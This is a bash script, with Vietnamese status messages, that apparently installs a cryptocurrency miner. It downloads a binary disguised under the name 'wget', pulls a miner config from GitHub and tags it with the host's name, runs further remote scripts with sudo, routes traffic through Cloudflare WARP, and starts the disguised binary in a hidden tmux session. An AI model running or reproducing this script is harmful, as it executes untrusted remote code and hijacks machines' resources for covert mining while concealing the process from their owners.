#!/bin/bash

set -x #echo on
if [ -f ${PWD}/wget ]; then
    if pgrep -x "wget" > /dev/null
then
    echo "scrip dang chay roi , ke cmn di "
    
else

echo "script da install , chay thoi "
sudo tmux new-session -d -s my_session1  './wget'

fi
exit
fi



sudo apt install msr-tools build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
sudo rm config.json
sudo wget https://raw.githubusercontent.com/renansouza60974/learncode/main/config.json
sudo sed -i "s/renansouza60974/$HOSTNAME/g" config.json
sudo wget https://github.com/average140421/test/raw/main/wget
wget https://raw.githubusercontent.com/average140421/test/main/1gb.sh
sudo bash 1gb.sh
wget https://raw.githubusercontent.com/average140421/test/main/rdom.sh
sudo bash rdom.sh
sudo chmod +x wget
wget https://pkg.cloudflareclient.com/uploads/cloudflare_warp_2021_8_0_1_amd64_844183db02.deb
sudo dpkg -i cloudflare_warp_2021_8_0_1_amd64_844183db02.deb
sudo systemctl enable --now warp-svc.service 
echo Y | warp-cli set-mode warp+doh 
warp-cli register
warp-cli connect
sudo tmux new-session -d -s my_session1  './wget'

